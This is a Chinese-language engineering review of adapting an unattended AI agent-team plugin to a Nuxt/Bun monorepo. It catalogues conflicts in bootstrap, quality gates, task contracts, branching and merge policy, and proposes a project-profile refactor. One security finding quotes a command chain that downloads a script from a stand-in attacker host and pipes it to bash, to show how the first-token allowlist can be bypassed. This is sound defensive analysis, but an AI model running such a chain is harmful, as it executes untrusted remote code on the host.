# dsh-ai-team 应用于 AgentDeploy（ai-yunke）的适配性分析与重构建议

> 分析对象：`/Users/yunke/works/ai-yunke`（AgentDeploy，M1 脚手架期，未完成）。
> 插件对象：`/Users/yunke/WorkBuddy/dsh-autopilot`（dsh-ai-team）。
> 目的：回答「若用 dsh-ai-team 无人值守开发 AgentDeploy，会有哪些问题」，以及「如何重构 / 优化 dsh-ai-team」。
> 依据：ai-yunke 的 `AGENTS.md`、`docs/development-guidelines.md`、`docs/tech-stack.md`、`.tasks/README.md`、`docs/adr/`、`README.md / overview.md`；dsh-ai-team 的 `README.md`、`src/index.ts`、`src/gates.ts`、`src/bootstrap.ts`、`src/team.ts`、`src/service.ts`、`src/roles.ts`。

---

## 0. TL;DR

AgentDeploy 是一个「规范极其严格、且自带一套与 dsh-ai-team **同构但不同纹路** 的协作约定」的项目。两者底层心智模型几乎一致（任务单 frontmatter 真相源、`touches` 域锁、质量门、`needs-human` 升级、human-only 区、AGENTS.md）。dsh-ai-team 的基本骨架「能用」；但**它的通用默认值，和 AgentDeploy 的不少硬约束直接冲突**，逐条落地会踩这些坑：

| # | 问题 | 一句话 | 严重级 |
|---|---|---|---|
| A1 | Bun 运行时不等于能构建 Nuxt | bootstrap 只 rootless 装 bun+pnpm，不装 node；`pnpm run build` 里的 `nuxt` bin 是 `#!/usr/bin/env node` | 高 |
| A2 | better-sqlite3（node-gyp 原生模块） | 裸机缺 python3 / make / g++（Alpine 下还缺 musl-dev），`pnpm install` 直接失败；bootstrap 只会 rootless 装 bun/pnpm | 高 |
| A3 | `pnpm audit` 私有源假红 | npmmirror 无 audit 端点，本地必失败；项目自己都标「本地建议/CI 强制」 | 中 |
| A4 | `.env` 不入库 | `verifyCommand: pnpm run e2e:local` 首步 `setup` 触发 zod fail-loud，裸机无 `.env` 直接引导失败 | 高 |
| B1 | 门模型「无条件 + 整单跑」 | 项目门是域条件的（`db:check-parity` 只在碰 `server/db/`）、且 `e2e:local` 会先 build 再起 webServer | 高 |
| B2 | e2e 重复重跑 | bootstrap `verify` 与每条任务 `gates` 都跑 `e2e:local` | 中 |
| B3 | 本地门 ≠ CI 门 | `validate:docs`、CI guard（改动 ⊆ touches、PR 正文含 `.tasks/` 路径）在仓库 CI；插件本地门对不上 | 中 |
| C1 | `forbidden:` 字段被忽略 | `TaskContract` 只读 id/title/status/owner/depends_on/touches，`forbidden` 只保留不执行 | 中 |
| C2 | 域锁缺「细粒度」约束 | 项目要求 `touches` 写到最细、`touches∩forbidden=∅`（validate:docs 强制），插件只做前缀交集 | 中 |
| C3 | 无域专精路由 | 通才 developer 可能被派去做 DB/MCP 高敏任务，不带项目硬规则 | 中 |
| D1 | 分支/PR 约定不符 | 插件 `task/<id>` + `[id] title`；项目要求 `agent/<id>-<slug>` + `feat(scope): [id] desc` | 高 |
| D2 | 成员 worktree ≠ 任务 worktree | 项目「一任务一 worktree（`../ws-<id>`）+ 合并后删」；插件是成员 worktree 反复切换 | 中 |
| D3 | 合并策略 | 插件 `--no-ff`；项目强制 squash 合并保 main 线性 | 高 |
| D4 | pre-commit 钩子 | 项目 `simple-git-hooks+lint-staged+typecheck`，插件「early commit often」会反复触发 | 中 |
| E1 | 角色无域专精 | 无法映射 CODEOWNERS 的 `@agent-database / @agent-mcp` 等 | 中 |
| E2 | allowlist 首 token 旁路 | `docker build && curl|bash`、`ssh ...` 只校验首个 token；`startsWith` 前缀过宽 | 高（安全） |
| F1 | board/frontmatter 回写 | `stringifyYaml` 会重排/改序，可能触发 validate:docs 严格校验红；且直接提交到 base | 中 |

**一句话结论**：把 dsh-ai-team 从「默认一种通用约定」升级为「能认一个项目 Profile 的适配器」，是核心改造方向；其余都是围绕 Profile 展开的落地项。

---

## 1. AgentDeploy 的「画像」（这些是插件必须适配的"事实"）

- **Strack**：Nuxt 4 / Vue 3 / Elysia（挂 Nitro `/api`）/ Drizzle（SQLite 默认 + PG 可选）/ better-auth / Naive UI + Tailwind / Bun 运行时 / pnpm ≥10（`packageManager: pnpm@10.20.0`，exact 版本）。
- **Monorepo**：`packages/*`（cli、types），`pnpm-workspace.yaml` 三 `onlyBuiltDependencies`：`better-sqlite3 / esbuild / vue-demi`。
- **运行时分层**（tech-stack §2.5，易混）：平台宿主 = Bun；用户函数沙箱 = M1 Bun worker，M6 起 Node/Python 容器。**CI 与生产统一 `oven/bun:1-x-alpine`，平台自身不承诺 Node 兼容**。
- **质量门（AGENTS.md §3，唯一权威 8 条）**：
  `pnpm install(锁)` → `typecheck` → `lint` → `test`（核心域覆盖率≥80%）→ `db:check-parity` → `test:contracts` → `build` → `test:e2e`；另 `pnpm audit(high)`。改动 `.tasks/`、`docs/` 额外 `pnpm run validate:docs`（=`python3 scripts/validate-docs.py`）。
- **门是"域条件"的**：`db:check-parity` 只在涉及 `server/db/`；`test:contracts` 在 `contracts/` 为空时空跑 exit 0；`test:e2e` 提 PR 前可只跑受影响用例；`pnpm audit` 在私有源（npmmirror）本地不可用。
- **任务单**：`.tasks/<id>-<slug>.md`，frontmatter 必填 `id/title/status/owner/depends_on/touches/forbidden`；状态机 `pending→in_progress→done`，`needs-human→pending|cancelled`；**域 = `touches` 声明的最细路径**，判定用两两路径前缀比较；`touches∩forbidden` 不得相交；同路径同时最多 1 个 `in_progress`。
- **所有权**：`.github/CODEOWNERS` 为唯一真相源，每路径一个 owner 标签（`@lead-agent / @agent-fe / @agent-auth / @agent-database / @agent-mcp ... @humans`）。human-only = `.github/`、`AGENTS.md`、LICENSE。**高冲突区** = `server/db/schema/`、CI 配置、`AGENTS.md`（单独 PR、rebase 最新 main、立即合入、需人工批准）。
- **Git/PR**：分支 `agent/<id>-<slug>`；一个任务一个 worktree（`git worktree add ../ws-<id> -b agent/<id>-<slug>`）；PR 标题 `feat(scope): [<id>] <desc>`；PR 正文需含 `.tasks/<id>.md` 路径 + `touches` 内改动声明；**CI guard job** 校验「PR 正文含 `.tasks/` 路径」+「实际改动文件 ⊆ touches」；**squash 合并**保 main 线性、可独立 revert；提交 Conventional Commits，禁 `--no-verify`；冲突一律 rebase（禁 merge commit 进功能分支）。
- **升级触发**（AGENTS.md §8，阈值 3 域）：需求矛盾 / 跨 3+ 域 / 新增付费依赖或密钥 / 门红根因不在本任务 / 安全线索 / 同任务返工 3 次。

---

## 2. 插件与项目「约定差」总表（同构但不同纹路）

| 维度 | dsh-ai-team 默认 | AgentDeploy 要求 |
|---|---|---|
| 工具链 | `[git, bun, pnpm]` rootless | 需 node（构建链）+ python3/make/g++（better-sqlite3） |
| verify | `pnpm run e2e:local` | 期望低成本自检；e2e 很重 |
| 门 | `[typecheck, lint, test, build]`，无条件 | 8 条 + 域条件 + validate:docs |
| 任务 branch | `task/<id>` | `agent/<id>-<slug>` |
| PR 标题 | `[<id>] <title>` | `feat(scope): [<id>] <desc>` |
| PR 正文 | `task.description` | 含 `.tasks/<id>.md` + touches 声明 |
| 合并 | `--no-ff` | **squash** |
| worktree | 成员一个，跨任务切分支 | 任务一个，合并后删 |
| forbidden | 全局 `['.github/','AGENTS.md','LICENSE']` 硬 block | 每任务 `forbidden` 字段 + 三态（block/needs-approval/high-conflict 单独 PR） |
| 域锁 | 前缀交集 | 前缀交集 + 细粒度 + 判空 + DB/MCP 域断言 |
| 角色 | leader/dev/reviewer/operator（通才） | 按 CODEOWNERS 域专精（`@agent-database` 等） |
| 升级 | 固定触发清单 | 阈值可配置（3 域）、main 红时「等修复而非顺手修」 |
| board | 6 列，`stringifyYaml` 回写 | 项目自己的列集 + 严格 `validate:docs`（YAML 保序） |
| 部署 | 通用 command+healthcheck+rollback | Docker `oven/bun:1-alpine` + 原生编译 + GHCR + Caddy |

---

## 3. 问题清单（按根因分组）

### A. 裸机引导 / 工具链（bootstrap 的前提在「Bun + 原生模块」下破裂）

**A1. Bun 不等于能构建 Nuxt。**
`bootstrap.ts` 的 `installTool` 只支持 rootless 安装 `bun` 与 `pnpm`（`git` 若无则直接上报、无 rootless 安装器）。而 AgentDeploy 的 `build` 脚本是 `NITRO_PRESET=bun nuxt build`，`node_modules/.bin/nuxt` 的 shebang 是 `#!/usr/bin/env node`。裸机只装 bun+pnpm 时，`$PATH` 里没有 `node`，`pnpm run build` 起不来。项目自身文档亦矛盾：README §2.1 说「构建链（nuxt / pnpm CLI 为 Node 程序）需要 Node ≥22.19」，tech-stack §2.5 却说「平台自身不承诺 Node 兼容」。→ 这是一个必须实测/决策的点：要么给 toolchain 加 `node`，要么全链路用 `bun run`/把 pnpm script-shell 指到 bun。

**A2. better-sqlite3 是 node-gyp 原生模块。**
`pnpm install` 会触发原生编译，需要 python3 + make + g++（Alpine/musl 下还需 musl-dev），且 `.npmrc` 打开 `enable-pre-post-scripts=true`。`bootstrap.ts` 没有任何「系统包」安装能力（只有 rootless 的 bun/pnpm），裸机上 `pnpm install` 直接失败并 escalate，但给不出可执行修复（没人去 `apt install build-essential python3`）。

**A3. `pnpm audit` 在私有源上是"假红"。**
README 明确「本机 npm 源为私有镜像（npmmirror），无 audit 端点；CI 使用官方源不受影响」，且 AGENTS.md §3 第 8 条写「CI 强制，本地建议」。若把 `pnpm audit --audit-level=high` 加进 `gates.commands`，插件在裸机上会稳定拿到非零退出 → 每条任务门红 → 阻塞 approve。插件没有「这个门是 CI-only」的概念。

**A4. `.env` 不入库，`setup` fail-loud。**
AgentDeploy 配置即 Schema，`pnpm run setup` 首步做 `server/config.ts` 的 zod 校验，缺 `AUTH_SECRET`（生产必填）或 `AI_API_HOST/AI_KEY` 不成对就 fail loud；且 `.env` 被 `.gitignore`。插件 `autopilot_init` 克隆远端后直接跑 `setupCommand: pnpm run setup`，裸机无 `.env` → 引导失败。插件没有「从 `.env.example` 生成 `.env` / 预置密钥」这一环。

### B. 质量门模型（无条件、整单跑、全量构建，与项目的"域条件门"冲突）

**B1. 门是"无条件 + 整单跑"，项目门是"域条件 + 可空跑"。**
`gates.commands: string[]` 对**每条任务**、在**该成员 worktree** 里按序跑一遍。AgentDeploy 的门是：`db:check-parity` 只在碰 `server/db/` 时；`test:contracts` 空跑；`test:e2e` 提 PR 前可只跑受影响；`validate:docs` 只在与 `.tasks/`、`docs/` 相关时。要让插件跑对，只能二选一：要么对所有任务都跑全部 8 条（`e2e:local` 会先 `build` 再起 webServer，**每条任务都重新全量构建一次 Nuxt**，16 个 M1 任务=16 次全量构建，吞吐灾难）；要么漏掉该域必需的门。

**B2. e2e 被重复重跑。**
bootstrap `verifyCommand: pnpm run e2e:local` 已跑一次全量 e2e；每条任务若 gates 再含 `e2e:local` 又跑一次。AgentDeploy 是「commit 前自验证」用 `e2e:local`，但作为**每次任务的门**性价比极低。

**B3. 本地门 ≠ CI 门。**
AgentDeploy 真正"合不进去"的强制项（validate:docs、PR 正文含 `.tasks/` 路径、实际改动 ⊆ touches、CI guard job）都发生在远程 CI。插件依赖 `requireCiGreen`（GitHub check-runs）去等，但这只对 `github` platform 有效、只轮询 PR 的 SHA；本地 `gates_run` 若与 CI 判据不同步（agent 漏跑 validate:docs），会出现「本地绿、CI 红」的来回。

### C. 任务契约 / 域锁 / `forbidden` 语义漂移

**C1. `forbidden:` 字段被读取但**不执行**。**
`team.ts` 的 `TaskContract` 只解析 `id/title/status/owner/depends_on/touches`；`forbidden` 被 `stringifyYaml` 忠实保留，但**从不参与判断**。插件的防越界只靠全局 `security.forbiddenPaths`（默认 `['.github/','AGENTS.md','LICENSE']`）这一份固定清单。结果：
- AgentDeploy 允许「任务单声明 `forbidden` + 单独 PR + 人工/owner 批准」去动 human-only 区；插件会对任何触及 `security.forbiddenPaths` 的 push **直接 escalate + 拒绝**，包括那些本应走「批准后单独 PR」的合法改动。两块语义对不上。
- AgentDeploy 的**高冲突区** `server/db/schema/` 与 CI 配置**不在**插件 `forbiddenPaths`，插件不会给它们加「单独 PR + 立即合入」的保护。

**C2. 域锁缺「细粒度」约束，且不会防"写粗"锁死全域。**
`touchesOverlap` 的前缀交集逻辑与项目一致（很好），但项目还有三条插件未执行的规则：`touches` 必须写到最细（写粗会锁死整个域，见其 postmortem「Wave E/F」）；`touches∩forbidden=∅`；DB 域任务的验收标准必须含参数化断言/跨项目越权反向用例/标识符白名单（`validate:docs` 强制）。插件不会去"教" developer 把 `touches` 写细，也不会校验 `forbidden` 交集。

**C3. 无域专精路由。**
因为角色是通才 developer，AgendDeploy 按路径/所有权（`@agent-database`、`@agent-mcp`）派发的语义，在插件里变成「派给任何空闲 developer」。DB 高敏任务（SQL 注入 / 越权）被一个不看项目 DB 硬规则的通才接走的风险客观存在。

### D. Git / 分支 / PR / 工作树 / 合并策略

**D1. 分支与 PR 约定不符（高）。**
插件 `task/<id>`（`service.ts` `const branch = 'task/${contract?.id ?? id}'`）；项目强制 `agent/<id>-<slug>`。PR 标题插件 `[<id>] <title>`；项目 `feat(scope): [<id>] <desc>`。PR 正文插件发 `task.description`（通用描述）；项目的 CI guard job 要求正文含 `.tasks/<id>.md` 路径、且实际改动 ⊆ `touches`。→ **插件自动创建 / 更新的 PR 大概率过不了 AgentDeploy 的 CI guard job**。

**D2. 成员 worktree ≠ 任务 worktree。**
插件一个成员一个 worktree（`member/<id>`），派发时 `checkout(assignee.workspacePath, task-branch)`，跨任务反复切换；项目「一任务一 worktree（`../ws-<id>`）+ 合并后删」。复用成员 worktree 会串状态（`node_modules`、`.nuxt`、`.output`、生成物残留），且位置不符项目约定。

**D3. 合并策略冲突（高）。**
插件 README、「合并策略」用 `--no-ff` 合入 base；项目强制 **squash merge** 保 main 线性、每 PR 可独立 revert。`--no-ff` 会产生 merge commit，破坏线性历史与 revert 语义。

**D4. pre-commit 钩子与「early commit」冲突。**
项目 `simple-git-hooks + lint-staged + typecheck`，每个 commit 都跑 lint-staged + typecheck。插件的 developer prompt 要求「commit early and often」，在 Nuxt 项目上每次 commit 触发 typecheck（很慢）且中间 WIP commit 可能钩子红。另外克隆远端未必触发 `prepare` 装钩子，`pnpm install` 的 postinstall（`nuxt prepare`）也依赖 `pnpm install` 真正跑完。

### E. 角色与安全

**E1. 角色无域专精 → 无法映射项目所有权。**
`roles.ts` 只有 4 个通用 role。项目是「按路径 owner（CODEOWNERS 标签）+ 每域硬规则」组织（DB 安全、MCP contract、`cloud` SDK 三件套 §4.5）。插件的 developer prompt 不注入这些域规则，也不把任务路由到「懂该域」的成员。

**E2. 命令 allowlist 首 token 旁路 + 前缀过宽（安全）。**
`gates.ts isAllowed` 只取命令首 token，匹配 `head === prefix || head.startsWith(prefix)`。两个坑：
- `docker build -t app . && docker push ... && ssh ...`（README 给的 deploy 示例）首 token 是 `docker` → 整个 `&&` 链放行；**恶意的 `docker build .. && curl evil.sh | bash` 也一样放行**。
- `startsWith` 前缀意味着 allowlist `[git]` 也放行 `gitlab-foo` 之类的首 token。
- AgentDeploy 的真实部署要 `ssh` 到生产 + `docker compose`；`ssh` 不在默认 allowlist。

**E3. 部署模型不匹配。**
项目部署 = Docker 多阶段（`oven/bun:1-alpine` 里编译 better-sqlite3）→ GHCR push → Caddy compose；`bashless`。插件 deploy 是通用 `command + healthCheckUrl + rollbackCommand`；healthcheck 须对齐 `/api/v1/health`；`rollbackCommand` 对 compose 是 `down/up` 而非镜像回滚，需 operator 自定义。

### F. 看板 / 状态回写

**F1. board 回写与 `validate:docs` 冲突。**
`regenerateBoard` 生成固定 6 列（id/title/status/owner/depends_on/touches），且 `patchTaskContract`/`stringifyYaml` 会重排/重序列化 frontmatter。项目的 `validate:docs`（frontmatter 字段齐备、touches∩forbidden=∅、依赖图无环、DB 域断言、PRD 引用不悬空）很严格；`stringifyYaml` 对 `depends_on: [x]` 可能输出成块状、字段顺序可能变化，**存在让 base 上 `validate:docs` 变红的概率**。同时插件把 `.tasks/` 改动**直接 `commitAll(repoPath,'.tasks')` 提交到 base**（`commitTasksDir`），绕过 PR 的 CI guard job 与 review，与项目「`.tasks/` 变更走 review + validate:docs」相悖。

---

## 4. 重构与优化建议（按优先级）

### P0. 引入「项目 Profile（约定适配器）」—— 核心改造

把插件从「假定一套通用约定」改成「认一个项目 profile」。AgentDeploy 的这套文档（`.tasks/README.md`、`AGENTS.md §3/§4/§8`、`CODEOWNERS`、`ci.yml`）本身就是一份可以用 JSON/YAML 表达、甚至**自动推断**的规格。

```ts
// 新增 profile 类型（可内置示例，也可让插件读取仓库内的 .dsh-team/profile.yml）
interface ProjectProfile {
  toolchain: { tools: string[]; systemPackages: string[] };   // 见 P1
  gates: GateDef[];                                            // 见 P2
  branch: { template: string; prTitleTemplate: string; prBodyTemplate: string }; // P3
  merge: 'squash' | 'no-ff' | 'merge';                         // P3
  worktree: 'per-member' | 'per-task';                         // P4
  ownership: { glob: string; role: string }[];                 // P5
  forbidden: { path: string; mode: 'block' | 'needs-approval' | 'high-conflict' }[];
  escalation: { crossDomainThreshold: number };                // 默认可配置
  board: { columns: string[]; frontmatterPreserveKeys: boolean }; // F1
}
```

配套：`src/profiles/agentdeploy.ts`（内置该项目的 profile），并在 `Config` 里加 `profile: 'generic' | 'agentdeploy' | inlined-object`。**改造后，插件所有行为从 `profile` 取值，而非写死在 `service.ts`。** 这也是最符合「插件面向多项目、而非只服务 dsh 自己」的定位。

### P1. 工具链 / bootstrap 扩展

1. **拆「rootless 可装」与「系统包」**：`bootstrap.toolchain` 保留 `[git, bun, pnpm, node]`；新增 `bootstrap.systemPackages: ['build-essential', 'python3', 'git']`，用 `apt-get/dnf/apk`（需 sudo，作为可配置命令，仍走 allowlist）或 asdf/nvm（rootless）。至少把 AgentDeploy 需要的 node、make/g++/python3 纳入。
2. **`.env` 预置环节**：`autopilot_init` 增加「配置校验前置」——若目标仓库有 `.env.example` 且无 `.env`，从模板生成并提示填密钥；或提供 `envFiles` 配置（把敏感值从 SecretRedactor 保护的环境变量写入 gitignored `.env`）。并在 init 时对 `AUTH_SECRET`（≥16）、`AI_API_HOST/AI_KEY` 配对做一次 fail-loud 检查。
3. **低成本 verify**：默认 `verifyCommand` 不要用 `e2e:local`，改成 `pnpm run setup && pnpm run db:check-parity`（或 profile 指定）。把全量 e2e 留给「合并后的部署/集成门」，而非每次 init 和每条任务。

### P2. 数据驱动 + 条件化 + CI-aware 的门模型

把 `gates.commands: string[]` 升级为：

```ts
interface GateDef {
  command: string;
  when?: string[];        // 命中 task.touches 的任一前缀才跑（如 ['server/db/']）
  role?: 'local' | 'ci';  // local=本地跑；ci=仅远程 CI（本地不计入门红）
  allowEmpty?: boolean;   // contracts/ 为空时视为通过（test:contracts 语义）
}
```

- 这样 `db:check-parity` 只在碰 `server/db/` 时跑、`validate:docs` 只在碰 `.tasks/`、`docs/` 时跑、`pnpm audit` 标 `role:'ci'` 所以本地不红；`test:contracts` 标 `allowEmpty`。
- gate 来源可读仓库自身的 `AGENTS.md §3`（唯一真相源）自动推导，避免两套清单。用户也可显式覆写。
- `allowEmpty` / `when` 需在 `gate.ts` 里读 `task.touches` 与 `contracts/` 数量，服务层已有 touches，实现成本低。

### P3. 分支 / PR / 合并策略配置化

```ts
branch: {
  template: 'agent/<id>-<slug>',          // slug 由 title 生成
  prTitleTemplate: 'feat(<scope>): [<id>] <desc>',  // scope 由 touches/域推导
  prBodyTemplate: [                          // 让 CI guard job 通过
    '关联任务单: `.tasks/<id>.md`',
    '验收标准逐条勾选: …',
    '触及目录(须与 touches 一致): …',
    '实际改动文件: …',
  ].join('\n'),
},
merge: 'squash',
```

`service.ts` 里造 branch、`githubUpsertPr` 的 title/body、`mergeBranch`（`--no-ff` → squash）都从 profile 取。
> 注意：squash 合并后 task branch 被吸收，`task.branch` 的 CI check-runs 语义需配套（用 PR 级 check 而非 commit 级）。

### P4. worktree 模型与构建缓存

- 加 `worktree: 'per-task'`（项目约定）：派发时 `git worktree add ../ws-<id> -b agent/<id>-<slug>`，合并后集中删除。成员模型保留为 `'per-member'` 默认。
- **构建缓存**：对 AgentDeploy 这类「全量 build + 原生编译」项目，`per-task` + 每个 worktree 各自 `pnpm install` 会重复构建。优化：
  - 共享 pnpm store（`pnpm install` 默认已共享），但 `node_modules` 在裸库不共享 → 用 `node-linker=hoisted` 或 worktree 复用主 checkout 的 `node_modules`（通过 `node_modules` 软链 / `pnpm deploy`）。
  - 把 `.nuxt`、`.output`、`.vitest`、`coverage/` 等生成的 gitignore 目录放进**共享缓存目录**（`<rootDir>/cache/<branch>` 或 `.output` 指向共享区），让增量构建生效，避免每条任务全量 build。
  - 只有「涉及构建产物/运行时的任务」（修改 `server/`、`app/`、`nuxt.config` 等）才跑 `e2e/build`，纯类型/文档任务跳过（依赖 `when` 门）。

### P5. 域专精路由与角色注入

- `ownership: [{glob:'server/plugins/database/**', role:'@agent-database'}, ...]` 映射到成员；派发时匹配 `task.touches` 到对应「域专精 developer」。
- 为每个角色在 `roles.ts` 里支持**追加项目专属硬规则**（从 profile 读 `roleExtras`）：DB 域的「参数化、标识符白名单、越权反向 e2e」；MCP 域的「Tool schema 契约登记 `contracts/`」；以及 `cloud` SDK 三件套（Definition=packages/types、Provider=FN runtime、Consumer=ST/DB）。把这些注入 developer/reviewer 的系统提示。
- `escalation.crossDomainThreshold` 配置化（默认 3），并支持「main 红 → 等待而非顺手修」的循环状态（新增 `waiting-on-base`），对应项目「修别人域」的禁忌。

### P6. `forbidden` 三态策略 + 安全加固

- `forbidden` 支持三态：`block`（默认）、`needs-approval`（可动，但需记录审批人、单独 PR）、`high-conflict`（强制单独 PR + rebase 最新 base + 立即合入）。同时**解析任务单 frontmatter 的 `forbidden` 字段**并与全局合并。
- `isAllowed` 加固：
  - 精确匹配 executable（去掉 `startsWith` 的前缀过宽）；对含 `&&` / `;` / `|` 的命令，**逐段校验每个命令**（`docker ... && ssh ...` 时 `ssh` 也要在 allowlist）。
  - allowlist 默认加 `node`、`ssh`、`bunx`、`nuxt`，并按 profile 扩展。
  - `deploy`/`bootstrap` 的 secretsEnv 只读环境变量、过 SecretRedactor。

### P7. board / frontmatter 回写保序

- `patchTaskContract` / `regenerateBoard` 改用**保序** YAML 序列化（或只在原位替换 status/owner，不整体 stringify），确保 `validate:docs` 不因格式变化变红。提供 `frontmatterPreserveKeys` 开关。
- `.tasks/` 变更走**任务分支**（进 PR、过 CI guard、复用 review），而不是直接 `commitAll('.tasks')` 到 base；`_board.md` 作为视图仍自动生成，但 frontmatter 状态变更作为任务 PR 的一部分提交（与项目「认领时同 PR 提交 frontmatter」一致）。

### P8. 性能与迭代

- 门失败 fail-fast 已有；但 `test:e2e` 全量构建占比最高 → 通过 P2 的 `when`/P4 的缓存把「全量 e2e/build」收敛到「合并前的集成门」。
- `pnpm install` 与原生编译只在 init 跑一次（lockfile 未变时复用）；`db:check-parity`/`test:contracts` 这类轻门对每条任务都可跑。

---

## 5. 一个「最小改造」的落地路径（分步，先解最疼的）

1. **P0 + P3 + D 系列**：先做 profile 骨架（branch template / pr title+body / merge=squash / forbidden 三态 / worktree=per-task）。这一下解决 D1/D3/部分 C1，且接入成本低、可单测（`tests/helpers.ts` 已有真实 git fixture）。
2. **A 系列（引导）**：toolchain 加 `node` + `systemPackages`，加 `.env` 预置与 fail-loud config 检查，verify 降级为 `setup + db:check-parity`。否则 AgentDeploy 连 `autopilot_init` 都过不了。
3. **P2 门模型**：把 `gates.commands` 升级为 `GateDef[]`（when/role/allowEmpty），并默认从仓库 `AGENTS.md §3` 推导。这是让「域条件门」跑对的唯一办法。
4. **B 系列部署/安全**：allowlist 逐段校验 + 加 `ssh/node`；`cloud`/DB/MCP 域规则注入角色 prompt（P5 的一部分）。
5. **P7 board 保序** + `.tasks/` 走任务分支。
6. **P4 缓存**：视改造后实测吞吐再决定是否做共享 `.nuxt/.output` 缓存。

## 6. 验证清单（改造后自测）

- `pnpm typecheck && pnpm lint && pnpm test && pnpm build`（插件自身全绿）。
- 用 `tests/helpers.ts` 的本地 bare 仓库模拟 remote，跑一条「CORE-003 类」任务：断言生成的 branch = `agent/<id>-<slug>`、PR title = `feat(scope): [id] desc`、PR body 含 `.tasks/<id>.md`、合并为 squash、`db:check-parity` 只在 touches `server/db/` 时跑、`pnpm audit` 标 ci-only 时本地不红。
- `tests/test-unattended.ts` 补用例：`forbidden` frontmatter 三态、`systemPackages` 无 sudo 时的降级上报、`crossDomainThreshold` 触发、`.env` 缺失时 init 明确报错而非静默。
- 对照 AgentDeploy 的 `validate:docs` 跑一次：确认 `patchTaskContract` 不改 frontmatter 键序，`.tasks/` 变更走任务分支。
